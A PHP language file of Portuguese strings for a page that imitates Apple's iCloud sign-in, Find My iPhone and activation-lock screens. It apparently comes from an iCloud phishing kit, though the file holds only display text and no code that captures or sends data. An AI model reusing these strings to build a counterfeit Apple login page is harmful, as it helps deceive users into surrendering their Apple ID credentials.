<?php
/*
------------------
Language: Portugues
------------------
*/
 
$lang = array();
// Header 
$lang['PAGE_TITLE'] = 'iCloud';
$lang['SETUP_INSTRUCTIONS'] = 'Instruções de configuração';
// login form
$lang['SIGN_IN_TITLE'] = 'Inicie sessão no iCloud';
$lang['INCORRECT_ID'] = 'Seu ID Apple ou senha estava incorreto(a).';
$lang['APPLE_ID'] = 'ID Apple';
$lang['PASSWORD'] = 'Senha';
$lang['KEEP_ME'] = 'Manter a sessão aberta';
$lang['FORGOT_ID'] = 'Esqueceu o ID Apple ou senha?';
$lang['DONT_HAVE_ID'] = 'Você não tem um ID Apple? ';
$lang['CREATE_YOURS'] = 'Crie um agora.';
$lang['INCORRECT_ID2'] = 'Esqueceu o ID Apple ou senha?';
// Footer
$lang['CHECK_ACTIVATION'] = 'Verifique o status do bloqueio de ativação';
$lang['SYSTEM_STATUS'] = 'Status do sistema';
$lang['POLICY'] = 'Política de privacidade';
$lang['TERMS'] = 'Termos e condições';
$lang['COPYRIGHT'] = 'Copyright © 2018 Apple Inc. Todos os direitos reservados.';
// mobile version language
$lang['MOB_PAGE_TITLE'] = 'iCloud';
$lang['MOB_FIND'] = 'Buscar iPhone';
$lang['MOB_APPLE_ID'] = 'ID Apple';
$lang['MOB_EXAMPLE'] = 'E-mail';
$lang['MOB_PASSWORD'] = 'Senha';
$lang['MOB_REQUIRED'] = 'Obrigatória';
$lang['MOB_LOGIN'] = 'iniciar sessão...';
$lang['MOB_FORGOT_ID'] = 'Esqueceu o ID Apple ou Senha?';
$lang['MOB_SETUP_INSTRUCTIONS'] = 'Instruções de Configuração';
$lang['MOB_locating'] = 'Localizando...';
$lang['IDPWD_ERROR_ALERT1'] = 'A Verificação Falhou';
$lang['IDPWD_ERROR_ALERT2'] = 'Seu ID Apple ou sua senha estão incorretos.
';
$lang['IDPWD_ERROR_ALERT3'] = 'OK';
// Home Page
$lang['REMINDERS'] = 'Lembretes';
$lang['NOTES'] = 'Notas';
$lang['ICLOUD_DRIVE'] = 'iCloud Drive';
$lang['PHOTOS'] = 'Fotos';
$lang['CONTACTS'] = 'Contatos';
$lang['MAIL'] = 'Mail';
$lang['SETTINGS'] = 'Ajustes';
$lang['FIND_MY_IPHONE'] = 'Buscar iPhone';
$lang['KEYNOTE'] = 'Keynote';
$lang['NUMBERS'] = 'Numbers';
$lang['FIND_FRIENDS'] = 'Amigos';
$lang['PAGES'] = 'Pages';
// Find . php
$lang['ALL_DEVICES'] = 'Todos os dispositivos';
$lang['ICLOUD_SETTINGS'] = 'Ajustes de iCloud';
$lang['SIGN_OUT'] = 'Finalizar sessão';
$lang['LOCATE'] = 'Localização ...';
$lang['ALL_DEVICES_OFFLINE'] = 'Todos os dispositivos off-line';
$lang['NO_LOCO'] = 'Não há locais para ser exibidos, pois todos seus dispositivos estão off-line.';
?>